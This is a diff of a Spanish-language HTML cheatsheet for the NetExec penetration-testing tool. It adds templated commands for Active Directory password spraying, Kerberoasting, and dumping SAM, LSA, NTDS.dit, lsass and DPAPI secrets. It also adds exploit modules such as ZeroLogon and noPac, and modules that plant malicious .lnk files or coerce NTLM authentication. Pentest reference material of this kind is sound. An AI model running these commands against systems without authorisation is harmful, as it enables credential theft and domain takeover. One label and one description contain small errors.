@@ -6,6 +6,81 @@
   <title>NetExec — Cheatsheet</title>
   <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
   <link rel="stylesheet" href="style.css"/>
+  <style>
+    /* ── Estilos exclusivos de este cheatsheet ── */
+    .cmd-item { position: relative; }
+
+    /* Múltiples comandos en un mismo bloque: variante limpia sin $ repetidos */
+    .cmd-code + .cmd-code { margin-top: 4px; }
+
+    /* Sub-sección dentro de un grupo (SMB / LDAP / MSSQL / FTP) */
+    .cs-sub {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: .62rem;
+      color: var(--muted);
+      letter-spacing: .12em;
+      text-transform: uppercase;
+      margin: 22px 0 10px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .cs-sub::before {
+      content: '//';
+      opacity: .4;
+    }
+
+    /* Tag de protocolo junto al título */
+    .proto-tag {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: .6rem;
+      padding: 2px 8px;
+      border-radius: 4px;
+      letter-spacing: .06em;
+      margin-left: 8px;
+    }
+    .proto-smb  { background: #1a2028; color: #6090c0; border: 1px solid #2a3040; }
+    .proto-ldap { background: #201a28; color: #9060c0; border: 1px solid #302040; }
+    .proto-mssql{ background: #281a1a; color: #c06060; border: 1px solid #402020; }
+    .proto-ftp  { background: #1a2820; color: #60a080; border: 1px solid #203028; }
+    .proto-ssh  { background: #28221a; color: #c0a060; border: 1px solid #403020; }
+
+    /* Ref block (links) */
+    .ref-block {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-left: 3px solid #4a6a58;
+      border-radius: 0 9px 9px 0;
+      padding: 12px 16px;
+      margin-bottom: 22px;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+    .ref-label {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: .6rem;
+      color: var(--muted);
+      letter-spacing: .12em;
+      text-transform: uppercase;
+      margin-bottom: 2px;
+    }
+    .ref-block a {
+      font-size: .82rem;
+      color: #8ab8b0;
+      text-decoration: none;
+      transition: color .2s;
+    }
+    .ref-block a:hover { color: var(--bright); }
+
+    .hero-tag {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: .68rem;
+      color: var(--muted);
+      letter-spacing: .14em;
+      margin-bottom: 10px;
+    }
+  </style>
 </head>
 <body>
 
@@ -33,13 +108,13 @@
   <div class="sidebar-section">
     <p class="sidebar-label">En esta página</p>
     <ul class="sidebar-nav">
-      <li><a href="#uso básico"     class="nav-link"><span class="ico">✦</span> Uso Básico</a></li>
-      <li><a href="#autenticación"            class="nav-link"><span class="ico">✦</span> Autenticación</a></li>
-      <li><a href="#enumeraciónsmb"            class="nav-link"><span class="ico">✦</span> Enumeración (SMB)</a></li>
-      <li><a href="#enumeraciónldap"            class="nav-link"><span class="ico">✦</span> Enumeración (LDAP)</a></li>
-      <li><a href="#enumeraciónmssql"            class="nav-link"><span class="ico">✦</span> Enumeración (MSSQL)</a></li>
-      <li><a href="#dumping"    class="nav-link"><span class="ico">✦</span> Credential Dumping</a></li>
-      <li><a href="#módulos"            class="nav-link"><span class="ico">✦</span> Módulos</a></li>
+      <li><a href="#basico"      class="nav-link"><span class="ico">✦</span> Uso Básico</a></li>
+      <li><a href="#auth"        class="nav-link"><span class="ico">✦</span> Autenticación</a></li>
+      <li><a href="#enum"        class="nav-link"><span class="ico">✦</span> Enumeración</a></li>
+      <li><a href="#servicios"   class="nav-link"><span class="ico">✦</span> Por Servicio</a></li>
+      <li><a href="#dumping"     class="nav-link"><span class="ico">✦</span> Credential Dumping</a></li>
+      <li><a href="#vulns"       class="nav-link"><span class="ico">✦</span> Vulnerabilidades</a></li>
+      <li><a href="#modulos"     class="nav-link"><span class="ico">✦</span> Módulos</a></li>
     </ul>
   </div>
 
@@ -61,177 +136,314 @@
       <span>/</span>
       <a href="index.html#cheatsheets">cheatsheets</a>
       <span>/</span>
-      linux-privesc
+      netexec
     </div>
 
     <div class="doc-header">
       <p class="hero-tag">// CHEATSHEET</p>
       <h1>NetExec</h1>
-      <p>Comandos para la enumeración sobre distintos protocolos con NetExec.</p>
+      <p>Referencia de comandos para enumeración y post-explotación con NetExec.</p>
     </div>
 
-    <!-- USO BASICO -->
-    <div class="cs-group fade-in" id="uso básico">
+    <div class="ref-block">
+      <span class="ref-label">Docs &amp; Fuentes</span>
+      <a href="https://www.netexec.wiki/" target="_blank">netexec.wiki — Documentación oficial</a>
+      <a href="https://github.com/Pennyw0rth/NetExec" target="_blank">github.com/Pennyw0rth/NetExec</a>
+    </div>
+
+    <!-- USO BÁSICO -->
+    <div class="cs-group fade-in" id="basico">
       <h2 class="cs-group-title">Uso Básico</h2>
       <div class="cmd-list">
 
         <div class="cmd-item">
           <div class="cmd-code">nxc &lt;service&gt; &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt;</div>
           <div class="cmd-code">nxc &lt;service&gt; &lt;target&gt; -u &lt;username&gt; -H &lt;NT_HASH&gt;</div>
-          <p class="cmd-desc">Se puede realizar una enumeracion de credenciales a un servicio en especifico (MSSQL, LDAP, FTP, WINRM, SMB, etc), NetExec tambien permite realizar PtH (-H).</p>
+          <p class="cmd-desc">Sintaxis base para distintos servicios (<code>smb</code>, <code>ldap</code>, <code>mssql</code>, <code>ftp</code>, <code>ssh</code>, <code>winrm</code>, etc). El flag <code>-H</code> permite Pass-the-Hash (PtH).</p>
         </div>
+
       </div>
     </div>
 
-    <!-- AUTENTICACION -->
-    <div class="cs-group fade-in" id="autenticación">
+    <!-- AUTENTICACIÓN -->
+    <div class="cs-group fade-in" id="auth">
       <h2 class="cs-group-title">Autenticación</h2>
       <div class="cmd-list">
 
         <div class="cmd-item">
-          <div class="cmd-code">nxc &lt;service&gt; &lt;target&gt; -u '' -p ''</div>
-          <p class="cmd-desc">Autenticación nula.</p>
+          <div class="cmd-code">nxc smb &lt;target&gt; -u '' -p ''</div>
+          <p class="cmd-desc"><strong>Null authentication</strong> — sin credenciales.</p>
         </div>
 
         <div class="cmd-item">
-          <div class="cmd-code">nxc &lt;service&gt; &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt;</div>
-          <p class="cmd-desc">Autenticación con el usuario <code style="font-family:'Share Tech Mono',monospace;color:#a0c8a0">guest</code>, usuario por defecto en Windows.</p>
+          <div class="cmd-code">nxc smb &lt;target&gt; -u 'guest' -p ''</div>
+          <p class="cmd-desc"><strong>Guest authentication</strong> — usuario por defecto en Windows.</p>
         </div>
 
         <div class="cmd-item">
-          <div class="cmd-code">nxc &lt;service&gt; &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; --local-auth</div>
-          <p class="cmd-desc">Autenticación local, esta sirve para forzar la autenticación contra cuentas locales del sistema operativo (SAM) en vez de cuentas de AD.</p>
+          <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; --local-auth</div>
+          <p class="cmd-desc"><strong>Local authentication</strong> — fuerza autenticación contra cuentas locales (SAM) en lugar de cuentas de AD.</p>
         </div>
 
         <div class="cmd-item">
           <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -k</div>
           <div class="cmd-code">nxc ldap &lt;target&gt; --use-kcache</div>
-          <p class="cmd-desc">Autenticación utilizando ticket de kerberos.</p>
+          <p class="cmd-desc"><strong>Kerberos authentication</strong> — usa ticket activo en caché (<code>-k</code>) o KRB5CCNAME (<code>--use-kcache</code>).</p>
         </div>
+
+        <div class="cmd-item">
+          <div class="cmd-code">nxc smb &lt;targets&gt; --gen-relay-list relay.txt</div>
+          <p class="cmd-desc"><strong>SMB Signing</strong> — genera lista de hosts sin signing habilitado, candidatos para relay attacks.</p>
+        </div>
+
       </div>
     </div>
 
-    <!-- ENUMERACION SMB -->
-    <div class="cs-group fade-in" id="enumeraciónsmb">
-      <h2 class="cs-group-title">Enumeración (SMB)</h2>
+    <!-- ENUMERACIÓN GENERAL -->
+    <div class="cs-group fade-in" id="enum">
+      <h2 class="cs-group-title">Enumeración General</h2>
       <div class="cmd-list">
 
         <div class="cmd-item">
           <div class="cmd-code">nxc smb &lt;target&gt;</div>
-          <p class="cmd-desc">Enumeración basica.</p>
+          <p class="cmd-desc">Enumeración básica: OS, hostname, dominio, versión SMB y signing.</p>
         </div>
 
         <div class="cmd-item">
           <div class="cmd-code">nxc smb &lt;target&gt; -u '' -p '' --shares</div>
           <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; --shares</div>
-          <p class="cmd-desc">Listar shares.</p>
+          <p class="cmd-desc">Listar shares disponibles.</p>
         </div>
 
-         <div class="cmd-item">
+        <div class="cmd-item">
           <div class="cmd-code">nxc smb &lt;target&gt; -u '' -p '' --users</div>
           <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; --users</div>
           <div class="cmd-code">nxc smb &lt;target&gt; -u '' -p '' --rid-brute</div>
-          <p class="cmd-desc">Listar usuarios.</p>
+          <p class="cmd-desc">Listar usuarios. <code>--rid-brute</code> enumera por RID sin credenciales.</p>
         </div>
 
         <div class="cmd-item">
           <div class="cmd-code">nxc smb &lt;target&gt; -u users.txt -p &lt;password&gt; --continue-on-success</div>
           <div class="cmd-code">nxc smb &lt;target&gt; -u users.txt -p passwords.txt --no-bruteforce --continue-on-success</div>
-          <p class="cmd-desc">Spraying.</p>
+          <p class="cmd-desc"><strong>Password spraying</strong> — <code>--no-bruteforce</code> evita probar automaticamente multiples contraseñas de una lista si la primera autenticacion .</p>
         </div>
+
       </div>
     </div>
 
-        <!-- ENUMERACION LDAP -->
-    <div class="cs-group fade-in" id="enumeraciónldap">
-      <h2 class="cs-group-title">Enumeración (LDAP)</h2>
+    <!-- POR SERVICIO -->
+    <div class="cs-group fade-in" id="servicios">
+      <h2 class="cs-group-title">Por Servicio</h2>
+
+      <!-- SMB -->
+      <p class="cs-sub"><span class="proto-tag proto-smb">SMB</span></p>
       <div class="cmd-list">
 
         <div class="cmd-item">
-          <div class="cmd-code">nxc ldap &lt;target&gt;</div>
-          <p class="cmd-desc">Enumeración basica.</p>
+          <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol</div>
+          <p class="cmd-desc">All-in-one LDAP: grupos, sesiones activas, usuarios, shares y política de contraseñas en un solo comando.</p>
         </div>
 
-         <div class="cmd-item">
+        <div class="cmd-item">
+          <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -k --get-file &lt;target_file&gt; &lt;output_file&gt; --share &lt;sharename&gt;</div>
+          <p class="cmd-desc">Descargar un archivo de un share específico.</p>
+        </div>
+
+        <div class="cmd-item">
+          <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -M spider_plus</div>
+          <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -M spider_plus -o READ_ONLY=false</div>
+          <p class="cmd-desc">Módulo <code>spider_plus</code> — enumerar y descargar archivos legibles de los shares.</p>
+        </div>
+
+      </div>
+
+      <!-- LDAP -->
+      <p class="cs-sub"><span class="proto-tag proto-ldap">LDAP</span></p>
+      <div class="cmd-list">
+
+        <div class="cmd-item">
           <div class="cmd-code">nxc ldap &lt;target&gt; -u '' -p '' --users</div>
           <div class="cmd-code">nxc ldap &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; --users</div>
-          <p class="cmd-desc">Listar usuarios.</p>
+          <p class="cmd-desc">Enumeración de usuarios.</p>
         </div>
 
         <div class="cmd-item">
-          <div class="cmd-code">nxc ldap &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; --bloodhound --dns-server ip --dns-tcp -c all</div>
-          <p class="cmd-desc">Extraer información de Active Directory en un formato BloodHound.</p>
-        </div>
-
-        <div class="cmd-item">
-          <div class="cmd-code">nxc ldap &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -M ldap-checker</div>
-          <p class="cmd-desc">Comprobar el estado de seguridad de LDAP: LDAP Signing y LDAPS Channel Binding, esto con la finalidad de realizar ataques como LDAP Relay.</p>
+          <div class="cmd-code">nxc ldap &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; --trusted-for-delegation --password-not-required --admin-count --users --groups</div>
+          <p class="cmd-desc">All-in-one LDAP: delegación, cuentas sin password, Admin Count, usuarios y grupos.</p>
         </div>
 
         <div class="cmd-item">
           <div class="cmd-code">nxc ldap &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; --kerberoasting hash.txt</div>
-          <div class="cmd-code">nxc ldap &lt;target&gt; -u &lt;username &gt; -p &lt;password&gt; --asreproast hash.txt</div>
-          <p class="cmd-desc">Kerberosting y ASREProast</p>
+          <div class="cmd-code">nxc ldap &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; --asreproast hash.txt</div>
+          <p class="cmd-desc">Kerberoasting y ASREProasting</p>
+        </div>
+
+        <div class="cmd-item">
+          <div class="cmd-code">nxc ldap &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; --bloodhound --dns-server &lt;ip&gt; --dns-tcp -c all</div>
+          <p class="cmd-desc">Recopilar datos de AD en formato BloodHound.</p>
+        </div>
+
+        <div class="cmd-item">
+          <div class="cmd-code">nxc ldap &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -M ldap-checker</div>
+          <p class="cmd-desc">Verificar estado de LDAP Signing y LDAPS Channel Binding para LDAP Relay.</p>
+        </div>
+
+        <div class="cmd-item">
+          <div class="cmd-code">nxc ldap &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -M adcs</div>
+          <p class="cmd-desc">Enumeración de ADCS.</p>
+        </div>
+
+        <div class="cmd-item">
+          <div class="cmd-code">nxc ldap &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -M maq</div>
+          <p class="cmd-desc">MachineAccountQuota — cantidad de cuentas de equipo que un usuario puede crear.</p>
         </div>
 
         <div class="cmd-item">
           <div class="cmd-code">nxc ldap &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -M pre2k</div>
-          <p class="cmd-desc">Enumerar cuentas de computadora con la opcion "Assign this computer account as a pre-Windows 2000 computer".</p>
+          <p class="cmd-desc">Identificar cuentas pre-Windows 2000 e intentar obtener ticket TGT utilizando su contraseña.</p>
         </div>
 
         <div class="cmd-item">
           <div class="cmd-code">nxc ldap &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; --find-delegation</div>
-          <p class="cmd-desc">Enumerar objetos que que pueden ser abusados para impersonar usuarios (Unconstrained Delegation, Constrained Delegation, Resource-Based Contrained Delegation).</p>
+          <p class="cmd-desc">Encontrar objetos con Unconstrained, Constrained o RBCD.</p>
         </div>
 
       </div>
-    </div>
 
-        <!-- ENUMERACION MSSQL -->
-    <div class="cs-group fade-in" id="enumeraciónmssql">
-      <h2 class="cs-group-title">Enumeración (MSSQL)</h2>
+      <!-- MSSQL -->
+      <p class="cs-sub"><span class="proto-tag proto-mssql">MSSQL</span></p>
       <div class="cmd-list">
 
         <div class="cmd-item">
-          <div class="cmd-code">nxc mssql &lt;target&gt; &lt;username&gt; -p &lt;password&gt; </div>
-          <p class="cmd-desc">Autenticación basica.</p>
+          <div class="cmd-code">nxc mssql &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt;</div>
+          <p class="cmd-desc">Autenticación básica en MSSQL.</p>
         </div>
 
         <div class="cmd-item">
-          <div class="cmd-code">nxc mssql &lt;target&gt; &lt;username&gt; -p &lt;password&gt; -x command</div>
-          <p class="cmd-desc">Ejecutar comandos (xp_cmdshell).</p>
+          <div class="cmd-code">nxc mssql &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -x &lt;command&gt;</div>
+          <p class="cmd-desc">Ejecutar comandos del sistema via <code>xp_cmdshell</code>.</p>
         </div>
+
       </div>
+
     </div>
 
     <!-- CREDENTIAL DUMPING -->
     <div class="cs-group fade-in" id="dumping">
-      <h2 class="cs-group-title">CREDENTIAL DUMPING</h2>
+      <h2 class="cs-group-title">Credential Dumping</h2>
+
+      <!-- Secrets Dump -->
+      <p class="cs-sub">LSA / SAM</p>
       <div class="callout">
-        <p>La base de datos <strong style="color:var(--text)">LSA</strong> (HKLM\LSA) y el proceso <strong style="color:var(--text)">SAM</strong> (HKLM\SAM) contienen usuarios junto a sus hashes.</p>
+        <p><strong>LSA</strong> (HKLM\LSA) y <strong>SAM</strong> (HKLM\SAM) contienen usuarios locales con sus hashes. Requiere privilegios de administrador.</p>
       </div>
       <div class="cmd-list">
         <div class="cmd-item">
           <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; --lsa</div>
           <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; --sam</div>
-          <p class="cmd-desc">Esto permite identificar si el usuario que agregamos tiene privilegios para poder realizar el dumping.</p>
+          <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; --sam --lsa --dpapi</div>
+          <p class="cmd-desc">Identificar si el usuario cuenta con privilegios necesarios para el Dumpeo.</p>
         </div>
       </div>
-    </div>
+
+      <!-- NTDS -->
+      <p class="cs-sub">NTDS.dit</p>
       <div class="callout">
-        <p><strong style="color:var(--text)">NTDS.dit</strong> es una base de datos que contiene toda la informacion del dominio.</p>
+        <p><strong>NTDS.dit</strong> es la base de datos del controlador de dominio — contiene todos los hashes del dominio. Requiere Domain Admin en un Domain Controller.</p>
       </div>
       <div class="cmd-list">
         <div class="cmd-item">
           <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; --ntds</div>
-          <p class="cmd-desc">Esto permite identificar si el usuario que agregamos tiene privilegios para poder realizar el dumping.</p>
+          <p class="cmd-desc">Identificar si el usuario cuenta con privilegios necesarios para el Dumpeo.</p>
+        </div>
+      </div>
+
+      <!-- DPAPI -->
+      <p class="cs-sub">DPAPI</p>
+      <div class="cmd-list">
+        <div class="cmd-item">
+          <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; --dpapi</div>
+          <p class="cmd-desc">Dumpear secretos protegidos por DPAPI: credenciales de navegadores, certificados, etc.</p>
+        </div>
+      </div>
+
+      <!-- lsass -->
+      <p class="cs-sub">lsass</p>
+      <div class="cmd-list">
+        <div class="cmd-item">
+          <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -M lsassy</div>
+          <p class="cmd-desc">Dump de lsass en memoria via módulo <code>lsassy</code> — obtiene credenciales en texto claro(solo si WDigest esta activo).</p>
+        </div>
+      </div>
+
+      <!-- gMSA -->
+      <p class="cs-sub">gMSA</p>
+      <div class="cmd-list">
+        <div class="cmd-item">
+          <div class="cmd-code">netexec ldap &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; --gmsa</div>
+          <p class="cmd-desc">Recuperar contraseñas de cuentas gMSA.</p>
         </div>
       </div>
 
     </div>
 
+    <!-- VULNERABILIDADES -->
+    <div class="cs-group fade-in" id="vulns">
+      <h2 class="cs-group-title">Vulnerabilidades</h2>
+      <div class="cmd-list">
 
-      <footer>
+        <div class="cmd-item">
+          <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -M zerologon</div>
+          <p class="cmd-desc"><strong>ZeroLogon</strong> (CVE-2020-1472) — permite cambiar la contraseña del Domain Controller sin autenticación.</p>
+        </div>
+
+        <div class="cmd-item">
+          <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -M petitpotam</div>
+          <p class="cmd-desc"><strong>PetitPotam</strong> — fuerza autenticación NTLM del DC hacia un listener controlado.</p>
+        </div>
+
+        <div class="cmd-item">
+          <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -M nopac</div>
+          <p class="cmd-desc"><strong>noPac</strong> (CVE-2021-42278/42287) — escala de usuario de dominio a Domain Admin.</p>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- MÓDULOS ÚTILES -->
+    <div class="cs-group fade-in" id="modulos">
+      <h2 class="cs-group-title">Módulos Útiles</h2>
+      <div class="cmd-list">
+
+        <div class="cmd-item">
+          <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -M webdav</div>
+          <p class="cmd-desc"><strong>webdav</strong> — detecta si WebDAV está activo para relay via HTTP.</p>
+        </div>
+
+        <div class="cmd-item">
+          <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -M veeam</div>
+          <p class="cmd-desc"><strong>veeam</strong> — extrae credenciales almacenadas en servidores de backup Veeam.</p>
+        </div>
+
+        <div class="cmd-item">
+          <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -M slinky</div>
+          <p class="cmd-desc"><strong>slinky</strong> — crea archivos .lnk maliciosos en shares para capturar hashes NTLM.</p>
+        </div>
+
+        <div class="cmd-item">
+          <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -M coerce_plus -o LISTENER=&lt;ip-controlled&gt;</div>
+          <p class="cmd-desc"><strong>coerce_plus</strong> — fuerza autenticación NTLM del objetivo hacia el listener (múltiples métodos de coerción).</p>
+        </div>
+
+        <div class="cmd-item">
+          <div class="cmd-code">nxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -M enum_av</div>
+          <p class="cmd-desc"><strong>enum_av</strong> — detecta antivirus y EDR instalados en el objetivo.</p>
+        </div>
+
+      </div>
+    </div>
+
+    <footer>
       <p>© 2025 zeta &nbsp;·&nbsp; Offensive Security</p>
     </footer>
 
@@ -239,5 +451,6 @@
 </div>
 
 <script src="main.js"></script>
+
 </body>
 </html>
